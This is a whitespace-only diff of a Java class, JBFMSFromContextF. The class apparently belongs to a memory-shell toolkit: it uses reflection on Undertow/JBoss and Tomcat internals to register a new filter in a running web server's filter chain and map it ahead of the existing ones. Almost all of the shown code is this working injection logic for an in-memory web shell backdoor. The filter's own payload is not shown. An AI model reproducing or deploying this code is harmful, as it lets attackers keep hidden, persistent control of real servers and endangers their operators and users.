@@ -26,15 +26,15 @@ public class JBFMSFromContextF implements Filter {
 
             try {
                 Class.forName("io.undertow.servlet.spec.HttpServletRequestImpl");
-                Object context        = getMethodAndInvoke(req, "getServletContext", new Class[]{}, new Object[]{});
+                Object context = getMethodAndInvoke(req, "getServletContext", new Class[]{}, new Object[]{});
                 Object deploymentInfo = getFieldValue(context, "deploymentInfo");
-                Map    filters        = (Map) getMethodAndInvoke(deploymentInfo, "getFilters", new Class[]{}, new Object[]{});
+                Map filters = (Map) getMethodAndInvoke(deploymentInfo, "getFilters", new Class[]{}, new Object[]{});
 
                 if (!filters.containsKey(NAME)) {
-                    Class clazz                = JBFMSFromContextF.class;
-                    Class filterInfoClass      = Class.forName("io.undertow.servlet.api.FilterInfo");
+                    Class clazz = JBFMSFromContextF.class;
+                    Class filterInfoClass = Class.forName("io.undertow.servlet.api.FilterInfo");
                     Class instanceFactoryClass = Class.forName("io.undertow.servlet.api.InstanceFactory");
-                    Class implClass            = Class.forName("io.undertow.servlet.util.ConstructorInstanceFactory");
+                    Class implClass = Class.forName("io.undertow.servlet.util.ConstructorInstanceFactory");
 
                     Constructor factoryConstructor = implClass.getDeclaredConstructor(new Class[]{Constructor.class});
                     Object factory = factoryConstructor.newInstance(
@@ -60,7 +60,7 @@ public class JBFMSFromContextF implements Filter {
                 }
             } catch (Exception ignored) {
                 Object standardContext = null;
-                Object servletContext  = getMethodAndInvoke(req, "getServletContext", new Class[]{}, new Object[]{});
+                Object servletContext = getMethodAndInvoke(req, "getServletContext", new Class[]{}, new Object[]{});
                 if (servletContext != null) {
                     standardContext = getFieldValue(getFieldValue(servletContext, "context"), "context");
                 } else {
@@ -75,18 +75,18 @@ public class JBFMSFromContextF implements Filter {
                     contextClass.getDeclaredField("filterConfigs");
                 }
 
-                Map    filterConfigs = (Map) getFieldValue(standardContext, "filterConfigs");
-                Filter filter        = new JBFMSFromContextF();
+                Map filterConfigs = (Map) getFieldValue(standardContext, "filterConfigs");
+                Filter filter = new JBFMSFromContextF();
 
-                Class  filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
-                Object filterDef      = filterDefClass.newInstance();
+                Class filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
+                Object filterDef = filterDefClass.newInstance();
                 getMethodAndInvoke(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{NAME});
                 getMethodAndInvoke(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filter.getClass().getName()});
                 getMethodAndInvoke(filterDef, "setFilter", new Class[]{Filter.class}, new Object[]{filter});
                 getMethodAndInvoke(standardContext, "addFilterDef", new Class[]{filterDefClass}, new Object[]{filterDef});
 
-                Class  filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
-                Object filterMap      = filterMapClass.newInstance();
+                Class filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
+                Object filterMap = filterMapClass.newInstance();
 
                 getMethodAndInvoke(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{pattern});
                 getMethodAndInvoke(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{NAME});
@@ -96,7 +96,7 @@ public class JBFMSFromContextF implements Filter {
                 fieldMaps.setAccessible(true);
                 Object maps = fieldMaps.get(standardContext);
 
-                int    length  = Array.getLength(maps);
+                int length = Array.getLength(maps);
                 Object newMaps = Array.newInstance(filterMapClass, length + 1);
                 Array.set(newMaps, 0, filterMap);
                 for (int i = 0; i < length; i++) {
@@ -106,11 +106,11 @@ public class JBFMSFromContextF implements Filter {
 
                 getMethodAndInvoke(standardContext, "addFilterMap", new Class[]{filterMapClass}, new Object[]{filterMap});
 
-                Class  config       = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
+                Class config = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                 Object apacheConfig = null;
 
                 try {
-                    Class       conClass    = Class.forName("org.apache.catalina.Context");
+                    Class conClass = Class.forName("org.apache.catalina.Context");
                     Constructor constructor = config.getDeclaredConstructor(conClass, filterDefClass);
                     constructor.setAccessible(true);
                     apacheConfig = constructor.newInstance(standardContext, filterDef);
@@ -174,7 +174,7 @@ public class JBFMSFromContextF implements Filter {
     }
 
     public static Object createInstanceUnsafely(Class<?> clazz) throws Exception {
-        Class unsafeClass    = Class.forName("sun.misc.Unsafe");
+        Class unsafeClass = Class.forName("sun.misc.Unsafe");
         Field theUnsafeField = unsafeClass.getDeclaredField("theUnsafe");
         theUnsafeField.setAccessible(true);
         return getMethodAndInvoke(theUnsafeField.get(null), "allocateInstance", new Class[]{Class.class}, new Object[]{clazz});
